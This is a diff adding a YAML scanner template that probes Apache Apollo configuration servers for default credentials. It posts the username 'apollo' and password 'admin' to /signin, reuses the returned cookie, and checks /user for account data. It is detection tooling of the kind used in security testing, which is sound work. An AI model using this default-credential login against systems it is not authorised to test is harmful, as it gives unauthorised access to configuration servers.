@@ -1,0 +1,22 @@
+name: poc-yaml-apache-apollo-default-login
+rules:
+  - method: POST
+    path: /signin
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: username=apollo&password=admin&login-submit=Login
+    search: "Set-Cookie: (?P<cookie>[^\\n]+)"
+    expression: |
+      response.status == 302 && "Set-Cookie" in response.headers
+  - method: GET
+    path: /user
+    headers:
+      Cookie: "{{cookie}}"
+    expression: |
+      response.status == 200 && response.content_type.icontains("json") && (response.body.bcontains(b"\"userId\"") || response.body.bcontains(b"\"email\""))
+detail:
+  author: adysec/nuclei_poc
+  description: Apollo default apollo/admin credential check
+  links:
+    - https://github.com/adysec/nuclei_poc
+    - https://github.com/apolloconfig/apollo
